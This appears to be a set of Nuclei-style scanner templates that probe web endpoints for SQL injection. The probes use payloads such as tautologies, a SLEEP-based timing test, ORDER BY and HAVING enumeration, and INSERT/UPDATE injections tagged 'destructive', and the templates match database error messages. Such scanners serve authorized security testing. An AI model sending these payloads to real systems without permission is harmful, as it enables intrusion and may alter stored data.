id: sqli-json-injection
info:
  name: SQLi via JSON Body
  author: AniipID
  severity: critical
  description: Detects SQL injection through JSON API request bodies
  tags: sqli,json,api
requests:
  - method: POST
    path:
      - "{{BaseURL}}/api/query"
      - "{{BaseURL}}/graphql"
      - "{{BaseURL}}/api/search"
    body: '{"query":"SELECT * FROM users WHERE id = 1 OR 1=1"}'
    headers:
      Content-Type: "application/json"
    matchers:
      - type: regex
        regex:
          - "You have an error in your SQL"
          - "SQL syntax.*MySQL"
          - "You have an error"
          - "Unclosed quotation"
          - "Microsoft OLE DB.*SQL"
          - "ODBC SQL Server Driver"
          - "Incorrect syntax near"
          - "ERROR:  syntax error"
          - "ERROR:  unterminated"
          - "PG::Error"
          - "pg_query"
          - "SQLSTATE\\[[0-9]"
          - "ORA-009[0-9][0-9][0-9]"
          - "Microsoft Access.*(syntax|error)"
        condition: or
        name: "json-sqli"
---
id: sqli-header-injection
info:
  name: SQLi via Headers
  author: AniipID
  severity: critical
  description: Detects SQL injection through HTTP headers
  tags: sqli,headers,blind
requests:
  - method: GET
    path:
      - "{{BaseURL}}"
      - "{{BaseURL}}/api"
    headers:
      X-Forwarded-For: "' OR '1'='1"
      User-Agent: "' OR SLEEP(5)--"
      Cookie: "session=' OR '1'='1'--"
    matchers:
      - type: regex
        regex:
          - "Warning.*mysql_"
          - "mysql_fetch"
          - "MySqlException"
          - "SQL syntax"
          - "Unclosed quotation"
          - "Incorrect syntax near"
          - "Microsoft OLE DB"
          - "You have an error"
          - "PostgreSQL.*ERROR"
          - "PG::Error"
          - "SQLite.Exception"
          - "System.Data.SqlClient"
        condition: or
        name: "header-sqli"
---
id: sqli-order-by
info:
  name: SQLi ORDER BY Detection
  author: AniipID
  severity: high
  description: Detects SQL injection using ORDER BY clause enumeration
  tags: sqli,order-by,enumeration
requests:
  - method: GET
    path:
      - "{{BaseURL}}?id=1+ORDER+BY+1"
      - "{{BaseURL}}?id=1+ORDER+BY+2"
      - "{{BaseURL}}?id=1+ORDER+BY+3"
      - "{{BaseURL}}?id=1+ORDER+BY+4"
      - "{{BaseURL}}?id=1+ORDER+BY+5"
    matchers:
      - type: regex
        regex:
          - "Unknown column"
          - "column ['\"]?[0-9]+['\"]? does not exist"
          - "ORA-01785"
          - "ORDER BY clause"
        condition: or
        name: "order-by-error"
---
id: sqli-like-clause
info:
  name: SQLi LIKE Clause
  author: AniipID
  severity: high
  description: Detects SQL injection using LIKE pattern matching
  tags: sqli,like,blind
requests:
  - method: GET
    path:
      - "{{BaseURL}}?id=1+AND+1=1+UNION+SELECT+1,2,3+LIKE+'%25'"
      - "{{BaseURL}}?id=1+AND+'1'LIKE'1"
      - "{{BaseURL}}?id=1+AND+'admin'LIKE'a%25"
    matchers:
      - type: regex
        regex:
          - "You have an error in your SQL"
          - "SQL syntax.*MySQL"
          - "You have an error"
          - "Unclosed quotation"
          - "Incorrect syntax near"
          - "ERROR:  syntax error"
          - "PG::Error"
          - "Microsoft OLE DB.*SQL"
        condition: or
        name: "like-sqli"
---
id: sqli-insert-injection
info:
  name: SQLi INSERT Injection
  author: AniipID
  severity: critical
  description: Detects SQL injection in INSERT statements
  tags: sqli,insert,destructive
requests:
  - method: POST
    path:
      - "{{BaseURL}}/register"
      - "{{BaseURL}}/signup"
      - "{{BaseURL}}/user/create"
    body: "username=test'+AND+1=1--&password=test&email=test@test.com"
    matchers:
      - type: regex
        regex:
          - "Duplicate entry"
          - "SQL syntax"
          - "You have an error"
          - "Unclosed quotation"
          - "Incorrect syntax near"
          - "ERROR:  syntax error"
          - "PG::Error"
          - "Microsoft OLE DB.*SQL"
          - "SQLSTATE\\[[0-9]"
        condition: or
        name: "insert-sqli"
---
id: sqli-update-injection
info:
  name: SQLi UPDATE Injection
  author: AniipID
  severity: critical
  description: Detects SQL injection in UPDATE statements
  tags: sqli,update,destructive
requests:
  - method: POST
    path:
      - "{{BaseURL}}/profile/update"
      - "{{BaseURL}}/user/edit"
    body: "email=test@test.com'+AND+1=1--&name=test"
    matchers:
      - type: regex
        regex:
          - "SQL syntax"
          - "You have an error in your SQL"
          - "You have an error"
          - "Unclosed quotation"
          - "Incorrect syntax near"
          - "ERROR:  syntax error"
          - "PG::Error"
          - "Microsoft OLE DB.*SQL"
        condition: or
        name: "update-sqli"
---
id: sqli-having-clause
info:
  name: SQLi HAVING Clause
  author: AniipID
  severity: high
  description: Detects SQL injection using HAVING clause for column enumeration
  tags: sqli,having,enumeration
requests:
  - method: GET
    path:
      - "{{BaseURL}}?id=1+HAVING+1=1"
      - "{{BaseURL}}?id=1+GROUP+BY+1+HAVING+1=1"
    matchers:
      - type: regex
        regex:
          - "Unknown column"
          - "Column .* in 'having clause'"
          - "HAVING clause"
        condition: or
        name: "having-sqli"
---
id: sqli-comment-injection
info:
  name: SQLi Comment Injection
  author: AniipID
  severity: high
  description: Detects SQL injection using various comment styles
  tags: sqli,comment,bypass
requests:
  - method: GET
    path:
      - "{{BaseURL}}?id=1'--+-"
      - "{{BaseURL}}?id=1'/**/OR/**/1=1"
      - "{{BaseURL}}?id=1'--"
      - "{{BaseURL}}?id=1%23"
      - "{{BaseURL}}?id=1'/*!*/"
    matchers:
      - type: regex
        regex:
          - "You have an error in your SQL"
          - "SQL syntax.*MySQL"
          - "You have an error"
          - "Unclosed quotation"
          - "Incorrect syntax near"
          - "ERROR:  syntax error"
          - "PG::Error"
          - "Microsoft OLE DB.*SQL"
        condition: or
        name: "comment-sqli"
